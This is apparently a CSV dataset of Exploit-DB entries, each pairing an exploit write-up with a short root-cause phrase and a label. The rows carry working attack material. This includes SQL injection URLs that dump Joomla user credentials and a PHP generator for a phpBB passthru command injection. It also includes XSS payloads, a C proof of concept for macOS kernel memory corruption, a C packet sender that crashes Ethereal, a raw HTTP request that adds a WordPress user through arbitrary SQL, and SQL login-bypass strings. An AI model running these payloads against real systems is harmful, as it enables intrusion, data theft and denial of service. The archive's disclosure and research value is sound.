31245,"Joomla! / Mambo Component com_formtool - 'catid' SQL Injection source: https://www.securityfocus.com/bid/27884/info  The Joomla! and Mambo 'com_formtool' component is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_formtool&task=view&formid=2&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
28965,"Bitweaver 1.x - '/wiki/list_pages.php?sort_mode' SQL Injection source: https://www.securityfocus.com/bid/20996/info      Bitweaver is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.      Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.      Bitweaver 1.3.1 and prior versions are vulnerable; other versions may also be affected.       Since this issue is a duplicate of the the issue described in BID 20988 (Bitweaver Multiple Input Validation Vulnerabilities), this BID is being retired.      http://www.example.com/bitweaver/wiki/list_pages.php?find=&sort_mode=-98",fails to sufficiently sanitize user-supplied data,1
47486,"Microsoft Windows Kernel - Out-of-Bounds Read in CI!CipFixImageType While Parsing Malformed PE File We have encountered a Windows kernel crash in CI!CipFixImageType while trying to load a malformed PE image into the process address space as a data file (i.e. LoadLibraryEx(LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE)). An example crash log generated after triggering the bug is shown below:  --- cut --- *** Fatal System Error: 0x00000050                        (0xFFFFF8007B6E00AC,0x0000000000000000,0xFFFFF80079A7E5C1,0x0000000000000000)  Driver at fault:  ***        CI.dll - Address FFFFF80079A7E5C1 base at FFFFF80079A30000, DateStamp 8581dc0d . Break instruction exception - code 80000003 (first chance)  A fatal system error has occurred. Debugger entered on first try; Bugcheck callbacks have not been invoked.  A fatal system error has occurred.  [...]  ******************************************************************************* *                                                                             * *                        Bugcheck Analysis                                    * *                                                                             * *******************************************************************************  PAGE_FAULT_IN_NONPAGED_AREA (50) Invalid system memory was referenced.  This cannot be protected by try-except. Typically the address is just plain bad or it is pointing at freed memory. Arguments: Arg1: fffff8007b6e00ac, memory referenced. Arg2: 0000000000000000, value 0 = read operation, 1 = write operation. Arg3: fffff80079a7e5c1, If non-zero, the instruction address which referenced the bad memory 	address. Arg4: 0000000000000000, (reserved)  [...]  TRAP_FRAME:  fffffa8375df1860 -- (.trap 0xfffffa8375df1860) NOTE: The trap frame does not contain all registers. Some register values may be zeroed or incorrect. rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000 rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000 rip=fffff80079a7e5c1 rsp=fffffa8375df19f0 rbp=fffffa8375df1b30  r8=00000000000000c0  r9=fffff8007b6d0080 r10=0000000000000004 r11=fffff8007b6e0070 r12=0000000000000000 r13=0000000000000000 r14=0000000000000000 r15=0000000000000000 iopl=0         nv up ei ng nz ac po cy CI!CipFixImageType+0x9d: fffff800`79a7e5c1 418b44cb3c      mov     eax,dword ptr [r11+rcx*8+3Ch] ds:fffff800`7b6e00ac=???????? Resetting default scope  LAST_CONTROL_TRANSFER:  from fffff80077ea6642 to fffff80077dc46a0  STACK_TEXT:   fffffa83`75df0e18 fffff800`77ea6642 : fffff800`7b6e00ac 00000000`00000003 fffffa83`75df0f80 fffff800`77d22be0 : nt!DbgBreakPointWithStatus fffffa83`75df0e20 fffff800`77ea5d32 : fffff800`00000003 fffffa83`75df0f80 fffff800`77dd0fb0 fffffa83`75df14c0 : nt!KiBugCheckDebugBreak+0x12 fffffa83`75df0e80 fffff800`77dbca07 : ffff8ac5`62b15f80 fffff800`77ed0110 00000000`00000000 fffff800`78063900 : nt!KeBugCheck2+0x952 fffffa83`75df1580 fffff800`77de0161 : 00000000`00000050 fffff800`7b6e00ac 00000000`00000000 fffffa83`75df1860 : nt!KeBugCheckEx+0x107 fffffa83`75df15c0 fffff800`77c7aaef : 00000000`00000000 00000000`00000000 00000000`00000000 fffff800`7b6e00ac : nt!MiSystemFault+0x1d3171 fffffa83`75df16c0 fffff800`77dca920 : fffff800`7b6d0000 00000000`00000000 ffffe687`5031c180 00000000`00000000 : nt!MmAccessFault+0x34f fffffa83`75df1860 fffff800`79a7e5c1 : ffffe687`4f6b1080 fffff800`7b6d0080 00000000`00000000 fffff800`79a67280 : nt!KiPageFault+0x360 fffffa83`75df19f0 fffff800`79a7c879 : fffffa83`75df1cd0 00000000`00000000 00000000`c00000bb 00000000`00000000 : CI!CipFixImageType+0x9d fffffa83`75df1a30 fffff800`78285766 : fffffa83`75df1c70 fffff800`7b6d0000 00000000`0000000e fffff800`7b6d0000 : CI!CiValidateImageHeader+0x279 fffffa83`75df1bb0 fffff800`7828528a : 00000000`00000000 00000000`00000001 00000000`00000000 00000000`00011000 : nt!SeValidateImageHeader+0xd6 fffffa83`75df1c60 fffff800`7821e0da : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!MiValidateSectionCreate+0x436 fffffa83`75df1e50 fffff800`781fc861 : fffffa83`75df2180 fffffa83`75df1fb0 00000000`40000000 fffffa83`75df2180 : nt!MiValidateSectionSigningPolicy+0xa6 fffffa83`75df1eb0 fffff800`781dca20 : ffffe687`5031c180 fffffa83`75df2180 fffffa83`75df2180 ffffe687`5031c150 : nt!MiCreateNewSection+0x5ad fffffa83`75df2010 fffff800`781dcd24 : fffffa83`75df2040 ffffd483`86519790 ffffe687`5031c180 00000000`00000000 : nt!MiCreateImageOrDataSection+0x2d0 fffffa83`75df2100 fffff800`781dc37f : 00000000`11000000 fffffa83`75df24c0 00000000`00000001 00000000`00000002 : nt!MiCreateSection+0xf4 fffffa83`75df2280 fffff800`781dc110 : 000000bc`f7c78928 00000000`00000005 00000000`00000000 00000000`00000001 : nt!MiCreateSectionCommon+0x1ff fffffa83`75df2360 fffff800`77dce115 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtCreateSection+0x60 fffffa83`75df23d0 00007ffe`5771c9a4 : 00007ffe`54641ae7 00000000`00000000 00000000`00000001 40b28496`f324e4f9 : nt!KiSystemServiceCopyEnd+0x25 000000bc`f7c788b8 00007ffe`54641ae7 : 00000000`00000000 00000000`00000001 40b28496`f324e4f9 feafc9c1`1796ffa1 : ntdll!NtCreateSection+0x14 000000bc`f7c788c0 00007ffe`54645640 : 00000203`34a8b3d0 00000007`00000000 00007ffe`56d32770 00000000`00000022 : KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x2e7 000000bc`f7c78af0 00007ffe`5462c41d : 00000203`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNELBASE!LoadLibraryExW+0xe0 000000bc`f7c78b60 00007ffe`559f03d1 : 00000203`34a79130 00000000`00000000 00000203`34a96190 00007ffe`55a06d85 : KERNELBASE!GetFileVersionInfoSizeExW+0x3d 000000bc`f7c78bc0 00007ffe`559f035c : 00000000`00000000 00007ffe`549f10ff 00000203`34a79130 000000bc`f7c78f10 : shell32!_LoadVersionInfo+0x39 000000bc`f7c78c30 00007ffe`54a6c1c1 : 00000000`00000000 00000000`00000000 ffffffff`fffffffe 00000000`00000000 : shell32!CVersionPropertyStore::Initialize+0x2c  [...] --- cut ---  The direct cause of the crash is an attempt to read from an invalid out-of-bounds address relative to the kernel mapping of the parsed PE file. Specifically, we believe that it is caused by the lack of proper sanitization of the IMAGE_FILE_HEADER.SizeOfOptionalHeader field.  We have minimized one of the crashing samples down to a 3-byte difference in relation to the original file: one which increases the value of the SizeOfOptionalHeader field from 0x00e0 to 0x66e0, one that decreases SizeOfImage from 0x8400 to 0x0e00, and one that changes DllCharacteristics from 0 to 0x89 (IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY | 9).  The issue reproduces on Windows 10 and Windows Server 2019 (32-bit and 64-bit, Special Pools not required). The crash occurs when any system component calls LoadLibraryEx(LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE) against the file, either directly or through another API such as GetFileVersionInfoSizeExW() or GetFileVersionInfoW(). In practice, this means that as soon as the file is displayed in Explorer, or the user hovers the cursor over it, or tries to open the file properties, or tries to rename it or perform any other similar action, the system will panic. In other words, just downloading such a file may permanently block the user's machine until they remove it through Recovery Mode etc. The attack scenario is similar to the one described in https://www.fortinet.com/blog/threat-research/microsoft-windows-remote-kernel-crash-vulnerability.html. Due to the nature of the bug (OOB read), it could be also potentially exploited as a limited information disclosure primitive.  Attached is an archive with a minimized proof-of-concept PE image, the original file used to generate it, and three additional non-minimized samples. Please be careful when unpacking the ZIP as Windows may crash immediately once it sees the corrupted files on disk.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47486.zip",Invalid system memory was referenced,1
24274,"phpBB 2.0.x - 'viewtopic.php' PHP Script Injection source: https://www.securityfocus.com/bid/10701/info  The 'viewtopic.php' phpBB script is prone to a remote PHP script injection vulnerability because the application fails to properly sanitize user-supplied URI parameters before using them to construct dynamically generated web pages.  Exploiting this issue may allow a remote attacker to execute arbitrary commands in the context of the webserver that is hosting the vulnerable software.   <? $rush='ls -al'; //do what $highlight='passthru($HTTP_GET_VARS[rush])'; // dont touch  print ""?t=%37&rush="";  for ($i=0; $i<strlen($rush); ++$i) {  print '%' . bin2hex(substr($rush,$i,1)); }  print ""&highlight=%2527."";  for ($i=0; $i<strlen($highlight); ++$i) {  prt '%' . bin2hex(substr($highlight,$i,1)); }  print "".%2527""; ?>",the application fails to properly sanitize user-supplied URI parameters before using them to construct dynamically generated web pages,1
41792,"Apple macOS/iOS Kernel 10.12.3 (16D32) - SIOCSIFORDER Socket ioctl Memory Corruption Due to Bad Bounds Checking /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1108  SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.  it falls through to calling:   ifnet_reset_order(ordered_indices, ifo->ifo_count) where ordered_indicies points to attacker-controlled bytes.  ifnet_reset_order contains this code:    for (u_int32_t order_index = 0; order_index < count; order_index++) {     u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)     if (interface_index == IFSCOPE_NONE ||         (int)interface_index > if_index) {           <-------------------------- (b)       break;     }     ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)     if (ifp == NULL) {       continue;     }     ifnet_lock_exclusive(ifp);     TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)     ifnet_lock_done(ifp);     if_ordered_count++;   }  at (a) a controlled 32-bit value is read into an unsigned 32-bit variable. at (b) this value is cast to a signed type for a bounds check at (c) this value is used as an unsigned index  by providing a value with the most-significant bit set making it negative when cast to a signed type we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds below the ifindex2ifnet array.  This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.  tested on MacOS 10.12.3 (16D32) on MacbookAir5,2  (on 64-bit platforms the array index wouldn't wrap around so the read would actually occur > 2GB above the array, not below) */  // ianbeer #if 0 MacOS/iOS kernel memory corruption due to Bad bounds checking in SIOCSIFORDER socket ioctl  SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.  it falls through to calling:   ifnet_reset_order(ordered_indices, ifo->ifo_count) where ordered_indicies points to attacker-controlled bytes.  ifnet_reset_order contains this code:    for (u_int32_t order_index = 0; order_index < count; order_index++) {     u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)     if (interface_index == IFSCOPE_NONE ||         (int)interface_index > if_index) {           <-------------------------- (b)       break;     }     ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)     if (ifp == NULL) {       continue;     }     ifnet_lock_exclusive(ifp);     TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)     ifnet_lock_done(ifp);     if_ordered_count++;   }  at (a) a controlled 32-bit value is read into an unsigned 32-bit variable. at (b) this value is cast to a signed type for a bounds check at (c) this value is used as an unsigned index  by providing a value with the most-significant bit set making it negative when cast to a signed type we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds below the ifindex2ifnet array.  This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.  tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 #endif  #include <stdlib.h> #include <stdio.h> #include <unistd.h>  #include <sys/ioctl.h> #include <sys/socket.h>  #include <mach/mach.h>  struct if_order { 	u_int32_t			ifo_count; 	u_int32_t			ifo_reserved; 	mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */ };  #define SIOCSIFORDER  _IOWR('i', 178, struct if_order)  int main() { 	uint32_t data[] = {0x80001234};  	struct if_order ifo;   ifo.ifo_count = 1;   ifo.ifo_reserved = 0;   ifo.ifo_ordered_indices = (mach_vm_address_t)data;    int fd = socket(PF_INET, SOCK_STREAM, 0);   int ret = ioctl(fd, SIOCSIFORDER, &ifo);    return 0; }",Bad bounds checking in SIOCSIFORDER socket,1
28465,"VisualShapers EZContents 2.0.3 - 'Loginreq2.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/19780/info  ezContents is prone to a cross-site scripting vulnerability because it fails to sanitize input before displaying it to users of the application.  An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/loginreq2.php?subgroupname=""><script>alert(666)</script>",fails to sanitize input before displaying it to users of the application,1
37017,Invision Power Board (IP.Board) 4.2.1 - 'searchText' Cross-Site Scripting source: https://www.securityfocus.com/bid/52740/info  Invision Power Board is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Invision Power Board 4.2.1 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?s=blablabla&&app=gallery&module=ajax&section=albumSelector&do=albumSelectorPane&secure_key=blalblabla&type=upload&albums=search&moderate=&album_id=1593&member_id=&searchType=member&searchMatch=is&searchIsGlobal=0&searchSort=date&searchDir=desc&searchText=%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert%280x000252%29%3C%2Fscript%3E,fails to sanitize user-supplied input,1
24259,"Ethereal 0.x - Multiple iSNS / SMB / SNMP Protocol Dissector Vulnerabilities // source: https://www.securityfocus.com/bid/10672/info    Ethereal 0.10.5 has been released to address multiple vulnerabilities, including an iSNS protocol dissector vulnerability, a SMB protocol dissector vulnerability, and a SNMP protocol dissector vulnerability. These issues are due to a failure of the application to properly handle malformed packets.  Successful exploitation of these issues will allow an attacker to cause a denial of service condition in the affected application, it has also been reported that these issues may facilitate arbitrary code execution.  /*  * Ethereal network protocol analyzer  * iSNS Dissector zero-length payload  * denial of service vulnerability  * proof of concept code  * version 1.0 (Aug 05 2004)  * CVE ID: CAN-2004-0633  *  * by Remi Denis-Courmont < exploit at simphalampin dot com >  *   http://www.simphalempin.com/dev/  *  * Vulnerable:  *  - Ethereal v0.10.4  *  * Not vulnerable:  *  - Ethereal v0.10.3 and earlier  *  - Ethereal v0.10.5  *  * The code above should cause Ethereal (or tethereal -V) to abort.  */   /*****************************************************************************  * Copyright (C) 2004  Remi Denis-Courmont.  All rights reserved.            *  *                                                                           *  * Redistribution and use in source and binary forms, with or without        *  * modification, are permitted provided that the following conditions        *  * are met:                                                                  *  * 1. Redistributions of source code must retain the above copyright notice, *  *    this list of conditions and the following disclaimer.                  *  * 2. Redistribution in binary form must reproduce the above copyright       *  *    notice, this list of conditions and the following disclaimer in the    *  *    documentation and/or other materials provided with the distribution.   *  *                                                                           *  * The author's liability shall not be incurred as a result of loss of due   *  * the total or partial failure to fulfill anyone's obligations and direct   *  * or consequential loss due to the software's use or performance.           *  *                                                                           *  * The current situation as regards scientific and technical know-how at the *  * time when this software was distributed did not enable all possible uses  *  * to be tested and verified, nor for the presence of any or all faults to   *  * be detected. In this respect, people's attention is drawn to the risks    *  * associated with loading, using, modifying and/or developing and           *  * reproducing this software.                                                *  * The user shall be responsible for verifying, by any or all means, the     *  * software's suitability for its requirements, its due and proper           *  * functioning, and for ensuring that it shall not cause damage to either    *  * persons or property.                                                      *  *                                                                           *  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *  * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *  * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *  * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *  * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *  * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *  * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *  * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *  * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *  * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *  *                                                                           *  * The author does not either expressly or tacitly warrant that this         *  * software does not infringe any or all third party intellectual right      *  * relating to a patent, software or to any or all other property right.     *  * Moreaver, the author shall not hold someone harmless against any or all   *  * proceedings for infringement that may be instituted in respect of the     *  * use, modification and redistrbution of this software.                     *  *****************************************************************************/   #include <string.h> #include <stdio.h>  #ifndef WIN32 # include <sys/types.h> # include <unistd.h> # include <sys/socket.h> # include <netdb.h> #else # include <winsock2.h> # include <ws2tcpip.h>  # define close( fd ) closesocket_clean (fd) # define perror( str ) (void)fprintf (stderr, ""%s: Winsock error %d\n"", \                                 str, WSAGetLastError ())  # undef gai_strerror # define gai_strerror( i ) gai_strerror_does_not_link (i) static const char * gai_strerror_does_not_link (int errval) {         static char buf[32];          sprintf (buf, ""Winsock error %d"", errval);         return buf; }  /* Winsock has the foolish habit of resetting error value to zero */ static int closesocket_clean (int fd) {         int errval, retval;          errval = WSAGetLastError ();         retval = closesocket (fd);         if (retval == 0)                 WSASetLastError (errval);          return retval; } #endif  static const char packet[] =         /* iSNS header */         ""\x00\x01"" /* Version */         ""\x00\x01"" /* Function ID */         ""\x00\x1c"" /* Length */         ""\x04\x00"" /* Flags: First PDU */         ""\x00\x00"" /* Transaction ID */         ""\x00\x00"" /* Sequence ID */          /* iSNS payload */         ""\x00\x00\x00\x03""         ""\x00\x00\x00\x00"" /* Length (invalid) */ ;   static int proof (const char *target) {         int fd;         struct addrinfo *res, *ptr, hints;          memset (&hints, 0, sizeof (hints));         hints.ai_socktype = SOCK_DGRAM;         /* 'd work with TCP too, but UDP is much more straight-forward */          fd = getaddrinfo (target, ""3205"", &hints, &res);         if (fd)         {                 fprintf (stderr, ""%s: %s\n"", target, gai_strerror (fd));                 return -1;         }          fd = -1;          for (ptr = res; ptr != NULL && fd == -1; ptr = ptr->ai_next)         {                 fd = socket (ptr->ai_family, ptr->ai_socktype,                                 ptr->ai_protocol);                 if (fd == -1)                         continue;                  if (connect (fd, ptr->ai_addr, ptr->ai_addrlen))                 {                         close (fd);                         fd = -1;                 }         }          freeaddrinfo (res);          if (fd == -1)                 perror (target);         else         {                 size_t len;                  len = sizeof (packet) - 1;                 if (send (fd, packet, len, 0) == len)                 {                         puts (""Packet sent!"");                         close (fd);                         return 0;                 }                 perror (""Packet sending error"");                 close (fd);         }          return -1; }   static int usage (const char *path) {         fprintf (stderr, ""Usage: %s <hostname/IP>\n"", path);         return 2; }   int main (int argc, char *argv[]) {         int retval;          puts (""Ethereal iSNS dissector zero-length vulnerability\n""                 ""proof of concept code\n""                 ""Copyright (C) 2004 Remi Denis-Courmont ""                 ""<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70""                 ""\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n"");  #ifdef WIN32         WSADATA wsaData;          if (WSAStartup (0x202, &wsaData) || wsaData.wVersion != 0x202)         {                 fputs (""Winsock version mismatch!\n"", stderr);                 return 2;         } #endif          if (argc != 2)                 return usage (argv[0]);          retval = proof (argv[1]) ? 1 : 0; #ifdef WIN32         WSACleanup (); #endif         return retval; }",a failure of the application to properly handle malformed packets,1
33613,"WordPress Plugin Participants Database 1.5.4.8 - SQL Injection Yarubo #1: Arbitrary SQL Execution in Participants Database for Wordpress =========================================================================  Program: Participants Database <= 1.5.4.8 Severity: Unauthenticated attacker can fully compromise the Wordpress installation Permalink: http://www.yarubo.com/advisories/1  — Info —  Participants Database is a popular Wordpress plugin that offers the functionality needed to build and maintain a database of people. As of today the plugin has been downloaded 92,089 times.  — Vulnerability details —  1. Due to insufficient privilege checks it is possible for anonymous (unauthenticated) users to trigger some administrative actions If any of the shortcodes is used (e.g. signup page).  2. The action ""export CSV"" takes a parameter called ""query"" that can contain an arbitrary SQL query. This means that an unauthenticated user can execute arbitrary SQL statements (e.g. create an admin user, read or write files, or execute code depending on the MySQL user privileges).   — Exploit —  Add a user to wordpress as follows (if you want an admin user, also add admin privileges to wp_usermeta):   POST /wordpress/pdb-signup/ HTTP/1.1 Host: www.example.com Content-Length: 789 (…) Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuoACADe1C2IFWMxN  ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""action""  output CSV ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""CSV_type""  participant list ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""subsource""  participants-database ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""query""  INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (31337,0x74657374,0x245024425a7a59615354486f41364b693355363576772f5461473861412f475a4b31,0x59617275626f,0x7465737440746573742e636f6d,0x323031342d31312d31312030303a30303a3030,0,0x59617275626f);  ------WebKitFormBoundaryuoACADe1C2IFWMxN    — Solution —  This issue has been fixed in version 1.5.4.9. Download the newest version from:  https://wordpress.org/plugins/participants-database/   — Credit —   Yarubo Research Team research [at] yarubo.com  Network Security Scan: http://www.yarubo.com/  Free Heartbleed Scan: http://www.yarubo.com/heartbleed",insufficient privilege checks,1
33361,"JiRo's (Multiple Products) - '/files/login.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/37045/info  Multiple JiRo's products are prone to multiple SQL-injection vulnerabilities because they fail to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the applications, access or modify data, or exploit latent vulnerabilities in the underlying database.  The following products are affected:  JBS 2.0 JBSX  Other products may also be affected.  The following proof-of-concept login and password examples are available:  admin 'or' '=' password 'or' '='",fail to sufficiently sanitize user-supplied data before using it in an SQL query,1
